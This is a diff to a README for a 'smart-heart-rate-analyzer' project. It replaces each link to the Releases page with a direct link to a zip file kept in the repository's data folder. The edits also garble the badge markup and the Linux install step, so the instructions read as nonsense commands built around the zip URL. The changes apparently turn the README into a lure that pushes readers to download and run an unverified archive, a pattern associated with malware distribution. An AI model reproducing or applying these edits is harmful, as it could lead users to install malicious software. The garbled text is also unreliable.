@@ -4,11 +4,11 @@
 
 Welcome to the **smart-heart-rate-analyzer** project! This application helps you analyze your heart rate data and visualize your health status in a simple way. Follow these steps to download and run the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20blue.svg)](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/releases)
+[![Download Now](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip%20Now-%https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip)](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the following link to download the application: [Download the smart-heart-rate-analyzer](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/releases).
+To get started, visit the following link to download the application: [Download the smart-heart-rate-analyzer](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip).
 
 1. **Visit the Releases Page:** Click the link above. This will take you to the Releases page where you can find the latest version of the software.
   
@@ -21,7 +21,7 @@ To get started, visit the following link to download the application: [Download 
 5. **Run the Application:**
    - For Windows: Double-click the `.exe` file to install the application.
    - For Mac: Open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux: Open a terminal, navigate to the downloaded file location and run `chmod +x filename.run` then `./filename.run`.
+   - For Linux: Open a terminal, navigate to the downloaded file location and run `chmod +x https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip` then `https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip`.
 
 ## 🔍 How to Use the Application
 
@@ -62,4 +62,4 @@ For support or feedback, please use the issues section of the repository. Your i
 
 Thank you for using **smart-heart-rate-analyzer**!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20blue.svg)](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/releases)
+[![Download Now](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip%20Now-%https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip)](https://github.com/shikaramiofficial/smart-heart-rate-analyzer/raw/refs/heads/main/data/heart_rate_smart_analyzer_v3.1.zip)
